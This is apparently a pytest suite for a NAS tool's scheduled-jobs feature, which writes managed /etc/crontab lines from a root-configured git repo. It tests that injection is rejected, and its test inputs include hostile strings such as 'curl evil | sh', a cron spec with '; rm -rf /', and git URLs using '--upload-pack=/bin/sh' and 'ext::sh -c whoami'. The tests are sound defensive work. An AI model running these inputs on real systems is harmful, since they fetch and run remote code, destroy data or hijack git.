"""Tests for the OPTIONAL scheduled-jobs capability (config/jobs.d -> managed
/etc/crontab block), in the SINGLE-root-configured-source model (design/12).

These prove the SECURITY INVARIANTS of the operator seam:
  (a) no per-declaration source: a declaration with a `source` key is REJECTED
      (JobDeclarationError, isolated as invalid) — never silently ignored;
  (b) derive-not-declare: a declaration with a `command` key is REJECTED, and the
      scheduled command is DERIVED as jobs/<name>;
  (c) fail-closed root source: get_configured_source returns None when
      config/jobs.source is absent, and the first non-comment line when present —
      the operator can never set it (it is a root-owned file);
  (d) sync_from_source end-to-end against a LOCAL git repo fixture: install
      jobs.d/foo.yaml, materialize jobs/foo (0755), and write the managed crontab
      line for the DERIVED command;
  (e) source-authoritative: a pre-existing local declaration NOT in the source is
      removed by sync;
  (f) apply_schedule (LOCAL, no fetch) skips a declared job whose jobs/<name>
      script is missing (no crontab line; reported in `skipped`);
  (g) block rewrite preserves a DSM synoschedtask line + the SHELL/PATH header;
  plus cron-spec validation and dormant-when-empty behavior.

Plain pytest with tmp_path/monkeypatch. `git` must be available for the LOCAL
repo fixture (it is in CI). The clone uses a file:// URL — schedule._is_git_url +
the GIT_ALLOW_PROTOCOL env permit `file://` because the source is ROOT-configured,
never operator input.
"""

import os
import stat
import subprocess

import pytest

from syrviscore import jobs_d, schedule


# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------


def _jobs_home(tmp_path):
    home = tmp_path / "syrviscore"
    (home / "config" / "jobs.d").mkdir(parents=True)
    (home / "jobs").mkdir(parents=True)
    return home


def _declare(home, name, body):
    (home / "config" / "jobs.d" / "{}.yaml".format(name)).write_text(body)


def _git(cwd, *args):
    subprocess.run(
        ["git", *args],
        cwd=str(cwd),
        check=True,
        capture_output=True,
        text=True,
        env={
            **os.environ,
            "GIT_AUTHOR_NAME": "t",
            "GIT_AUTHOR_EMAIL": "t@t",
            "GIT_COMMITTER_NAME": "t",
            "GIT_COMMITTER_EMAIL": "t@t",
        },
    )


def _make_source_repo(tmp_path, decls):
    """Build a LOCAL git repo laid out like the trusted jobs source and return a
    ``file://`` URL to it.

    ``decls`` maps name -> (yaml_body, script_body). Each name gets
    jobs.d/<name>.yaml and (if script_body is not None) jobs/<name>.
    """
    repo = tmp_path / "source_repo"
    (repo / "jobs.d").mkdir(parents=True)
    (repo / "jobs").mkdir(parents=True)
    for name, (yaml_body, script_body) in decls.items():
        (repo / "jobs.d" / "{}.yaml".format(name)).write_text(yaml_body)
        if script_body is not None:
            (repo / "jobs" / name).write_text(script_body)
    _git(repo, "init", "-q")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "jobs")
    return "file://{}".format(repo)


# A realistic /etc/crontab: the SHELL/PATH/MAILTO header + one DSM-owned task
# line (the kind reconcile must NEVER touch).
_DSM_CRONTAB = (
    "#minute\thour\tmday\tmonth\twday\twho\tcommand\n"
    "SHELL=/bin/bash\n"
    "PATH=/usr/bin:/bin:/usr/sbin:/sbin\n"
    "MAILTO=root\n"
    "0 0 20 * * root /usr/syno/bin/synoschedtask --run id=1\n"
)


# ---------------------------------------------------------------------------
# (a) no per-declaration source — a `source` key is REJECTED
# ---------------------------------------------------------------------------


def test_source_field_is_rejected(tmp_path):
    """A declaration carrying a `source` key is REJECTED (isolated as invalid),
    NOT silently ignored — an operator cannot point a job at an arbitrary repo.
    The one git source is root-configured (config/jobs.source)."""
    home = _jobs_home(tmp_path)
    _declare(
        home,
        "evil",
        "schedule: '*/5 * * * *'\n"
        "source: https://github.com/acme/jobs.git\n"
        "enabled: true\n",
    )
    valid, invalid = jobs_d.load_job_declarations(home)
    assert "evil" not in valid
    assert len(invalid) == 1
    assert invalid[0]["file"] == "evil.yaml"
    assert "source" in invalid[0]["error"].lower()


def test_source_field_raises_job_declaration_error():
    """The rejection is a JobDeclarationError at the from_dict boundary."""
    with pytest.raises(jobs_d.JobDeclarationError):
        jobs_d.JobDefinition.from_dict(
            "evil", {"schedule": "*/5 * * * *", "source": "https://x/y.git"}
        )


# ---------------------------------------------------------------------------
# (b) derive-not-declare — a `command` key is REJECTED
# ---------------------------------------------------------------------------


def test_command_field_is_rejected_derive_not_declare(tmp_path):
    """A declaration carrying a `command` key is REJECTED (isolated as invalid),
    NOT silently ignored. A compromised operator cannot inject a command."""
    home = _jobs_home(tmp_path)
    _declare(
        home,
        "evil",
        "schedule: '*/3 * * * *'\n"
        "enabled: true\n"
        "command: /bin/sh -c 'curl evil | sh'\n",
    )
    valid, invalid = jobs_d.load_job_declarations(home)
    assert "evil" not in valid
    assert len(invalid) == 1
    assert invalid[0]["file"] == "evil.yaml"
    assert "command" in invalid[0]["error"].lower()


def test_command_field_raises_job_declaration_error():
    with pytest.raises(jobs_d.JobDeclarationError):
        jobs_d.JobDefinition.from_dict(
            "evil", {"schedule": "*/3 * * * *", "command": "/bin/sh -c x"}
        )


def test_derived_command_is_jobs_slash_name(tmp_path):
    """The scheduled command is DERIVED from the name (jobs/<name>) — never from
    the declaration. Nothing the operator writes can influence it."""
    home = _jobs_home(tmp_path)
    job = jobs_d.JobDefinition.from_dict("login-alert", {"schedule": "*/3 * * * *"})
    jobs_dir = home / "jobs"
    assert job.derived_command(jobs_dir) == str(jobs_dir / "login-alert")
    line = job.crontab_line(jobs_dir)
    assert line == "*/3 * * * * root {}".format(jobs_dir / "login-alert")


# ---------------------------------------------------------------------------
# cron spec validation
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "bad",
    [
        "*/3 * * *",  # 4 fields
        "*/3 * * * * *",  # 6 fields
        "@reboot",  # not 5 fields / disallowed
        "*/3 * * * MON",  # names not allowed
        "*/3 * * * *; rm -rf /",  # metachars -> extra fields + bad chars
        "*/3 * * * $(x)",  # shell metachars
        "* * * * %s",  # '%' disallowed
    ],
)
def test_invalid_cron_spec_rejected(bad):
    with pytest.raises(jobs_d.JobDeclarationError):
        jobs_d.validate_cron_spec(bad)


@pytest.mark.parametrize(
    "good",
    [
        "*/3 * * * *",
        "0 0 * * *",
        "30 4 1,15 * 5",
        "0-59/5 * * * 0-6",
    ],
)
def test_valid_cron_spec_passes(good):
    assert jobs_d.validate_cron_spec(good) == " ".join(good.split())


def test_valid_declaration_loads(tmp_path):
    home = _jobs_home(tmp_path)
    _declare(home, "login-alert", "schedule: '*/3 * * * *'\nenabled: true\n")
    valid, invalid = jobs_d.load_job_declarations(home)
    assert invalid == []
    assert "login-alert" in valid
    assert valid["login-alert"].schedule == "*/3 * * * *"


# ---------------------------------------------------------------------------
# (c) fail-closed root-configured source
# ---------------------------------------------------------------------------


def test_get_configured_source_absent_is_none(tmp_path):
    """FAIL-CLOSED: no config/jobs.source -> None (sync is a dormant no-op)."""
    home = _jobs_home(tmp_path)
    assert schedule.get_configured_source(home) is None


def test_get_configured_source_returns_first_noncomment_line(tmp_path):
    """The source is the first non-comment, non-blank line of the root-owned file."""
    home = _jobs_home(tmp_path)
    schedule.get_source_config_path(home).write_text(
        "# the trusted jobs repo\n"
        "\n"
        "https://github.com/acme/jobs.git\n"
        "https://github.com/ignored/second.git\n"
    )
    assert schedule.get_configured_source(home) == "https://github.com/acme/jobs.git"


def test_get_configured_source_empty_is_none(tmp_path):
    """An empty/comment-only file -> None (fail-closed / dormant)."""
    home = _jobs_home(tmp_path)
    schedule.get_source_config_path(home).write_text("# only a comment\n\n")
    assert schedule.get_configured_source(home) is None


def test_sync_with_no_source_is_dormant_noop(tmp_path):
    """No config/jobs.source -> sync returns a dormant no-op, nothing written."""
    home = _jobs_home(tmp_path)
    monkey_crontab(tmp_path, "")  # would-be crontab; sync must not touch it
    result = schedule.sync_from_source(home)
    assert result["ok"] is True
    assert result["applied"] is False
    assert result["source"] is None


# ---------------------------------------------------------------------------
# crontab redirection helper (so sync/apply never touch the real /etc/crontab)
# ---------------------------------------------------------------------------
#
# read_crontab/write_crontab_atomic bind CRONTAB_PATH as a default argument at
# definition time, so reassigning the module constant is not enough — we redirect
# the two accessor functions to a temp file. autouse fixture restores originals.


_CRONTAB_HOLDER = {}
_CRONTAB_ORIG = {}


def monkey_crontab(tmp_path, initial_text):
    """Redirect schedule's crontab read/write to a temp file seeded with initial_text.

    Only usable inside a test that also uses the autouse `_restore_crontab`
    fixture below (which captures + restores the originals)."""
    path = tmp_path / "etc_crontab"
    path.write_text(initial_text)
    _CRONTAB_HOLDER["path"] = path

    def _read(p=None):
        return path.read_text() if path.exists() else ""

    def _write(new_text, p=None):
        _CRONTAB_ORIG["write"](new_text, path)

    schedule.CRONTAB_PATH = path
    schedule.read_crontab = _read
    schedule.write_crontab_atomic = _write
    return path


@pytest.fixture(autouse=True)
def _restore_crontab():
    _CRONTAB_ORIG["path"] = schedule.CRONTAB_PATH
    _CRONTAB_ORIG["read"] = schedule.read_crontab
    _CRONTAB_ORIG["write"] = schedule.write_crontab_atomic
    yield
    schedule.CRONTAB_PATH = _CRONTAB_ORIG["path"]
    schedule.read_crontab = _CRONTAB_ORIG["read"]
    schedule.write_crontab_atomic = _CRONTAB_ORIG["write"]
    _CRONTAB_HOLDER.clear()


# ---------------------------------------------------------------------------
# (d) sync_from_source end-to-end against a LOCAL git repo fixture
# ---------------------------------------------------------------------------


def test_sync_from_source_end_to_end(tmp_path):
    """Clone a LOCAL git repo, install jobs.d/foo.yaml, materialize jobs/foo (0755),
    and write the managed crontab line for the DERIVED command jobs/foo."""
    home = _jobs_home(tmp_path)
    crontab = monkey_crontab(tmp_path, _DSM_CRONTAB)

    url = _make_source_repo(
        tmp_path,
        {"foo": ("schedule: '*/5 * * * *'\nenabled: true\n", "#!/bin/sh\necho foo\n")},
    )
    schedule.get_source_config_path(home).write_text(url + "\n")

    result = schedule.sync_from_source(home)
    assert result["ok"] is True, result
    assert result["applied"] is True
    assert result["source"] == url

    # (d.1) config/jobs.d/foo.yaml installed + validates
    valid, invalid = jobs_d.load_job_declarations(home)
    assert invalid == []
    assert "foo" in valid

    # (d.2) jobs/foo materialized 0755
    dest = home / "jobs" / "foo"
    assert dest.is_file()
    mode = stat.S_IMODE(os.stat(dest).st_mode)
    assert mode == 0o755, oct(mode)
    assert dest.read_text().startswith("#!/bin/sh")

    # (d.3) the managed crontab block contains the DERIVED line
    text = crontab.read_text()
    assert "*/5 * * * * root {}".format(home / "jobs" / "foo") in text
    # and DSM's own line survives untouched
    assert "/usr/syno/bin/synoschedtask --run id=1" in text
    parsed = jobs_d.parse_managed_block(text)
    assert set(parsed) == {"foo"}


# ---------------------------------------------------------------------------
# (e) source-authoritative: a stale local declaration is removed by sync
# ---------------------------------------------------------------------------


def test_sync_removes_stale_local_declaration(tmp_path):
    """A pre-existing config/jobs.d/stale.yaml NOT provided by the source is removed
    by sync (the source is authoritative)."""
    home = _jobs_home(tmp_path)
    monkey_crontab(tmp_path, _DSM_CRONTAB)
    # a stale local declaration (with its script) that the source will NOT provide
    _declare(home, "stale", "schedule: '0 0 * * *'\nenabled: true\n")
    (home / "jobs" / "stale").write_text("#!/bin/sh\necho stale\n")

    url = _make_source_repo(
        tmp_path,
        {"foo": ("schedule: '*/5 * * * *'\nenabled: true\n", "#!/bin/sh\necho foo\n")},
    )
    schedule.get_source_config_path(home).write_text(url + "\n")

    result = schedule.sync_from_source(home)
    assert result["ok"] is True, result

    # stale.yaml is gone; only the source's foo remains declared
    assert not (home / "config" / "jobs.d" / "stale.yaml").exists()
    valid, _ = jobs_d.load_job_declarations(home)
    assert set(valid) == {"foo"}
    # and stale is not scheduled in the managed block
    parsed = jobs_d.parse_managed_block(schedule.CRONTAB_PATH.read_text())
    assert "stale" not in parsed
    assert set(parsed) == {"foo"}


# ---------------------------------------------------------------------------
# (f) apply_schedule (LOCAL, no fetch) skips a job whose script is missing
# ---------------------------------------------------------------------------


def test_apply_skips_job_with_missing_script(tmp_path):
    """apply_schedule is LOCAL (no fetch): a declared+enabled job whose jobs/<name>
    script is absent on disk is SKIPPED — no crontab line, reported in `skipped`."""
    home = _jobs_home(tmp_path)
    crontab = monkey_crontab(tmp_path, _DSM_CRONTAB)

    # declared + enabled, but NO jobs/ghost script on disk
    _declare(home, "ghost", "schedule: '*/7 * * * *'\nenabled: true\n")

    result = schedule.apply_schedule(home)
    assert "ghost" not in result["scheduled"]
    assert any(s["name"] == "ghost" for s in result["skipped"])
    assert result["ok"] is False  # a skip is a non-clean result

    text = crontab.read_text()
    # no crontab line for ghost; DSM line preserved; empty managed block
    assert "ghost" not in text
    assert "/usr/syno/bin/synoschedtask --run id=1" in text
    assert jobs_d.parse_managed_block(text) == {}


def test_apply_schedule_local_does_not_fetch(tmp_path, monkeypatch):
    """apply_schedule must NEVER clone: it is the boot/self-heal LOCAL path."""
    home = _jobs_home(tmp_path)
    monkey_crontab(tmp_path, _DSM_CRONTAB)
    _declare(home, "foo", "schedule: '*/5 * * * *'\nenabled: true\n")
    (home / "jobs" / "foo").write_text("#!/bin/sh\necho foo\n")

    def _boom(*a, **k):
        raise AssertionError("apply_schedule must not clone")

    monkeypatch.setattr(schedule, "_clone_configured_source", _boom)
    result = schedule.apply_schedule(home)
    assert result["ok"] is True
    assert result["scheduled"] == ["foo"]


# ---------------------------------------------------------------------------
# (g) block rewrite preserves DSM synoschedtask line + SHELL/PATH header
# ---------------------------------------------------------------------------


def test_block_rewrite_preserves_dsm_line_and_header(tmp_path):
    """Splicing the managed block leaves a DSM `synoschedtask --run id=1` line and
    the SHELL/PATH/MAILTO header verbatim, and is idempotent."""
    home = _jobs_home(tmp_path)
    jobs_dir = home / "jobs"
    _declare(home, "login-alert", "schedule: '*/3 * * * *'\nenabled: true\n")
    declarations, _ = jobs_d.load_job_declarations(home)
    desired = {n: j.crontab_line(jobs_dir) for n, j in declarations.items()}
    block = schedule.render_managed_block(desired)

    first = schedule._splice_block(_DSM_CRONTAB, block)
    # DSM's own task line + the header survive untouched.
    assert "0 0 20 * * root /usr/syno/bin/synoschedtask --run id=1" in first
    assert "SHELL=/bin/bash" in first
    assert "PATH=/usr/bin:/bin:/usr/sbin:/sbin" in first
    assert "MAILTO=root" in first
    # The managed block + our derived line are present, delimited.
    assert jobs_d.BLOCK_BEGIN in first
    assert jobs_d.BLOCK_END in first
    assert "*/3 * * * * root {}".format(jobs_dir / "login-alert") in first

    # Idempotent: splicing the SAME block again produces identical text.
    assert schedule._splice_block(first, block) == first

    # The parser only ever sees the managed line — never DSM's id=1 line.
    parsed = jobs_d.parse_managed_block(first)
    assert set(parsed) == {"login-alert"}
    assert "synoschedtask" not in " ".join(parsed.values())


def test_removing_declaration_shrinks_only_managed_block(tmp_path):
    """A disabled/undeclared job's managed line is removed; DSM's lines stay."""
    home = _jobs_home(tmp_path)
    jobs_dir = home / "jobs"
    _declare(home, "login-alert", "schedule: '*/3 * * * *'\nenabled: true\n")
    declarations, _ = jobs_d.load_job_declarations(home)
    desired = {n: j.crontab_line(jobs_dir) for n, j in declarations.items()}
    with_job = schedule._splice_block(_DSM_CRONTAB, schedule.render_managed_block(desired))

    _declare(home, "login-alert", "schedule: '*/3 * * * *'\nenabled: false\n")
    declarations, _ = jobs_d.load_job_declarations(home)
    current = jobs_d.parse_managed_block(with_job)
    plan = jobs_d.build_jobs_reconcile_plan(declarations, current, jobs_dir)
    assert plan["desired"] == {}
    assert any(a["kind"] == "remove" and a["name"] == "login-alert" for a in plan["actions"])

    empty = schedule._splice_block(with_job, schedule.render_managed_block(plan["desired"]))
    assert "login-alert" not in empty
    assert "/usr/syno/bin/synoschedtask --run id=1" in empty
    assert jobs_d.parse_managed_block(empty) == {}


# ---------------------------------------------------------------------------
# name != filename rejected; stray unknown keys rejected
# ---------------------------------------------------------------------------


def test_name_mismatch_is_rejected(tmp_path):
    home = _jobs_home(tmp_path)
    (home / "config" / "jobs.d" / "Bad Name.yaml").write_text("schedule: '*/3 * * * *'\n")
    valid, invalid = jobs_d.load_job_declarations(home)
    assert valid == {}
    assert len(invalid) == 1
    assert invalid[0]["file"] == "Bad Name.yaml"


def test_stray_name_key_is_rejected_as_unknown(tmp_path):
    home = _jobs_home(tmp_path)
    _declare(
        home,
        "login-alert",
        "name: something-else\nschedule: '*/3 * * * *'\n",
    )
    valid, invalid = jobs_d.load_job_declarations(home)
    assert "login-alert" not in valid
    assert len(invalid) == 1
    assert "unknown key" in invalid[0]["error"].lower()


# ---------------------------------------------------------------------------
# dormant / optional: empty or missing jobs.d
# ---------------------------------------------------------------------------


def test_empty_jobs_d_yields_empty_block(tmp_path):
    home = _jobs_home(tmp_path)
    valid, invalid = jobs_d.load_job_declarations(home)
    assert valid == {} and invalid == []

    plan = jobs_d.build_jobs_reconcile_plan(valid, {}, home / "jobs")
    assert plan["changed"] is False
    assert plan["desired"] == {}

    block = schedule.render_managed_block(plan["desired"])
    assert block == [jobs_d.BLOCK_BEGIN, jobs_d.BLOCK_END]
    spliced = schedule._splice_block(_DSM_CRONTAB, block)
    assert "/usr/syno/bin/synoschedtask --run id=1" in spliced
    assert jobs_d.parse_managed_block(spliced) == {}


def test_missing_jobs_d_dir_is_dormant(tmp_path):
    home = tmp_path / "syrviscore"
    (home / "config").mkdir(parents=True)
    valid, invalid = jobs_d.load_job_declarations(home)
    assert valid == {} and invalid == []


# ---------------------------------------------------------------------------
# transport gate: file:// is allowed (root-configured), '-' prefixed rejected
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "url",
    [
        "https://github.com/acme/jobs.git",
        "git@github.com:acme/jobs.git",
        "ssh://git@github.com/acme/jobs.git",
        "file:///srv/jobs",
    ],
)
def test_is_git_url_accepts_supported_transports(url):
    assert schedule._is_git_url(url) is True


@pytest.mark.parametrize(
    "url",
    [
        "",
        "--upload-pack=/bin/sh",
        "/etc/passwd",
        "ext::sh -c whoami",
        "ftp://example/x",
    ],
)
def test_is_git_url_rejects_unsupported(url):
    assert schedule._is_git_url(url) is False


# ---------------------------------------------------------------------------
# materialize: derived path, 0755, only the one named script
# ---------------------------------------------------------------------------


def test_materialize_writes_derived_path_0755(tmp_path):
    """materialize_job_script(checkout, name, jobs_dir) copies the repo's jobs/<name>
    to <jobs_dir>/<name> at 0755, from an already-cloned checkout."""
    home = _jobs_home(tmp_path)
    jobs_dir = home / "jobs"
    checkout = tmp_path / "checkout"
    (checkout / "jobs").mkdir(parents=True)
    (checkout / "jobs" / "login-alert").write_text("#!/bin/sh\necho hi\n")

    ok, msg = schedule.materialize_job_script(checkout, "login-alert", jobs_dir)
    assert ok, msg
    dest = jobs_dir / "login-alert"
    assert dest.is_file()
    assert stat.S_IMODE(os.stat(dest).st_mode) == 0o755
    assert dest.read_text().startswith("#!/bin/sh")


def test_materialize_rejects_missing_named_script(tmp_path):
    """A checkout with no jobs/<name> entrypoint is rejected — only the one named
    script is ever run, never arbitrary repo contents."""
    home = _jobs_home(tmp_path)
    checkout = tmp_path / "checkout2"
    checkout.mkdir(parents=True)
    (checkout / "README.md").write_text("nothing here")

    ok, msg = schedule.materialize_job_script(checkout, "login-alert", home / "jobs")
    assert not ok
    assert "login-alert" in msg
